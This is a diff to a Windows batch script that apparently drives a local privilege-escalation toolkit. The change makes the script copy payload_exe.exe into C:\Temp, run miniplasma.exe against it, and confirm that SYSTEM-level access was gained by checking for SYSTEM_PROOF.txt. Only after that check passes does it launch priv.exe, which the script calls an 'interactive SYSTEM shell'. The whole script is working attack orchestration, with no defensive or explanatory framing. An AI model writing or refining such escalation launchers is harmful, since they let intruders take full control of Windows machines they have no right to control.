@@ -40,7 +40,24 @@ for %%f in (priv.exe syshost.exe priv.bat miniplasma.exe payload_exe.exe GreenPl
     )
 )
 
-:: Run priv.exe (interactive SYSTEM shell)
+:: Test priv.exe with miniplasma first (writes SYSTEM_PROOF.txt)
 echo.
-echo [*] Launching priv.exe...
-priv.exe
+echo [*] Testing escalation via miniplasma...
+del /F /Q "C:\Temp\SYSTEM_PROOF.txt" >nul 2>&1
+mkdir C:\Temp >nul 2>&1
+copy /Y payload_exe.exe C:\Temp\payload_exe.exe >nul
+miniplasma.exe C:\Temp\payload_exe.exe
+echo.
+if exist "C:\Temp\SYSTEM_PROOF.txt" (
+    echo [+] TEST PASSED - escalation works:
+    type "C:\Temp\SYSTEM_PROOF.txt"
+    echo.
+    echo [*] Launching priv.exe...
+    priv.exe
+) else (
+    echo [-] TEST FAILED - SYSTEM_PROOF.txt not found
+    echo [-] Check miniplasma output above. Not launching priv.exe.
+    echo.
+    echo [*] Debug log ^(if any^):
+    if exist "C:\ProgramData\priv_debug.log" type "C:\ProgramData\priv_debug.log"
+)
